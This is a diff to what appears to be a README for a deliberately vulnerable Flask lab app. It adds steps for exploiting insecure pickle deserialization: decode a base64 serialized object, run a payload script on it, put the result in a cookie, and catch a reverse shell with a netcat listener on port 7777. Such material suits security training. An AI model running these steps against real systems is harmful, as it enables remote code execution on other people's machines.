@@ -36,4 +36,13 @@ Set-Variable -Name "FLASK_APP" -Value "rce.py"
 flask run
 ```
 
+For reading pickle object
+```
+echo gASVNAAAAAAAAAB9lCiMBHVzZXKUjAVwZXRlcpSMCGxhbmd1YWdllIwCYmeUjAZhY2Nlc3OUjARub25llHUu | base64 -d > obj.ser
+./payload obj.ser
+```
 
+For exploit use payload script and replace cookie value. For opening reverse shell use
+```
+nc -nvlp 7777
+```
